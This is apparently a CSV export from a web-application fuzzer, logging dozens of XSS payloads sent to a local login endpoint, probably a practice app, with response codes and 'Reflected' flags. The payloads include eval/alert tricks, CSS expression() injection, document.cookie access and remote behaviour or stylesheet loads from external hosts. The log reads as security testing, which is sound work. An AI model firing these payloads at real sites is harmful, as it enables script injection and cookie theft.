Task ID,Message Type,Req. Timestamp,Método,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
206,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,246,447,63,332,26,,,[';//%0da=eval;b=alert;a(b(9));//]
208,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,235,447,60,286,1253,,Reflected,['};a=eval;b=alert;a(b(13));//]
210,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,236,447,60,286,1253,,Reflected,['];a=eval;b=alert;a(b(15));//]
209,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,239,447,60,332,26,,,[1};a=eval;b=alert;a(b(14));//]
214,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,27,447,70,286,1109,,,"[style=color: expression(alert(0));"" a=""]"
215,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,20,447,89,286,1109,,,"[style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);"" a=""]"
211,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,129,447,60,332,26,,,[1];a=eval;b=alert;a(b(17));//]
217,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,35,448,173,286,1109,,,"[sstyle=foobar""tstyle=""foobar""ystyle=""foobar""lstyle=""foobar""estyle=""foobar""=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)"" a=""]"
218,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,36,447,91,286,1109,,,"[<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">]"
219,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,51,447,95,286,1109,,,"[<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">]"
220,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,52,447,77,286,1109,,,"[<DIV STYLE=""width: expression(alert('XSS'));"">]"
221,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,29,447,90,286,1109,,,"[<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>]"
223,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,45,448,106,286,1109,,,"[<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>]"
224,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,11,447,82,286,1109,,,"[<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>]"
225,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,448,117,286,1109,,,"[<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>]"
213,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,223,447,52,332,26,,,[xyz onerror=alert(6);]
212,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,228,447,65,332,26,,,[1;a=eval;b=alert;a(b(/c/.source));]
216,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,401,Unauthorized,200,448,105,332,26,,,[width: expression((window.r==document.cookie)?'':alert(r=document.cookie))]
222,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,109,447,83,286,1326,,Reflected,[<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>]
228,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,10,448,166,286,1109,,,"[<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>]"
227,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,13,447,80,286,1109,,,"[<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">]"
232,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,7,448,137,286,1109,,,"[<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>]"
231,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,10,448,146,286,1109,,,"[<html xmlns:xss><?import namespace=""xss"" implementation=""httP://ha.ckers.org/xss.htc""><xss:xss>xss</xss:xss></html>]"
226,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,24,447,83,286,1109,,,"[<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>]"
230,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,15,448,253,286,1109,,,"[<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert('xss')</script>""> </body></html>]"
229,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,18,448,168,286,1109,,,"[<xml id=""xss""><i><b><img src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span datasrc=""#xss"" datafld=""b"" dataformatas=""html""></span>]"
233,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,15,448,167,286,1107,,,"[<?xml version=""1.0""?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>]"
234,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,448,166,286,1109,,,"[<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('xss');"">]]></c></x></xml><span datasrc=#i datafld=c dataformatas=html>]"
235,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,448,168,286,1109,,,"[<xml id=""xss""><i><b><img src=""javas<!-- -->cript:alert('xss')""></b></i></xml><span datasrc=""#xss"" datafld=""b"" dataformatas=""html""></span>]"
237,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,15,448,146,286,1109,,,"[<html xmlns:xss><?import namespace=""xss"" implementation=""httP://ha.ckers.org/xss.htc""><xss:xss>xss</xss:xss></html>]"
236,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,17,448,253,286,1109,,,"[<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""xss<script defer>alert('xss')</script>""> </body></html>]"
238,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,448,137,286,1109,,,"[<xml src=""httP://ha.ckers.org/xsstest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>]"
239,Fuzzed,Mon Jun 01 18:51:53 WEST 2020,POST,http://10.0.2.2:3000/rest/user/login,500,Internal Server Error,16,448,167,286,1107,,,"[<?xml version=""1.0""?><html:html xmlns:html='httP://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>]"
